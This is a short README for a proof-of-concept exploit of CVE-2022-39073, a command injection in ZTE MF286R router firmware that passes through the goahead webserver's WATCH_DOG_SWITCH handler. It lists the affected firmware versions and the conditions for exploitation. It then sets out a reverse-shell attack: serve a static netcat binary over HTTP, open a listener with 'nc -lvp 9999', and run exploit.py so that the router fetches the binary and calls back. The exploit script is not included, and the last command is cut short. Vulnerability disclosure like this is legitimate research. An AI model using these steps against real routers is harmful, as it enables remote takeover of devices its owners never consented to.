# CVE-2022-39073

Firmware details:

```
wa_inner_version: BD_POSTEMF286RMODULEV1.0.0B12
cr_version: CR_ITPOSTEMF286RV1.0.0B10
```

## Prerequisites

- requests (`pip install requests`)

## Command Injection

The vulnerability is a shared command injection between the `zte_net_link_detect` binary and the `WATCH_DOG_SWITCH` handler in the webserver `goahead` binary.

Note that the vulnerability can only be exploited when the router is connected to the WAN or connected to the Internet via a SIM card. (The value of the "ppp_status" key must be "ppp_connected" or "ipv4_ipv6_connected" or "ipv6_connected").

### Risks

- Remote code execution (RCE)
- Arbitrary command execution

### Proof of Concept

The idea of exploit is to download the netcat static binary from an http server and then open a reverse shell with it.
P.S: The netcat included in this folder is big endian.

- Open an http server in this directory `python3 -m http.server 8080`
- Open a listening socket on port `9999` with `nc -lvp 9999`
- Run the script in this folder `python3 exploit.py http://  `
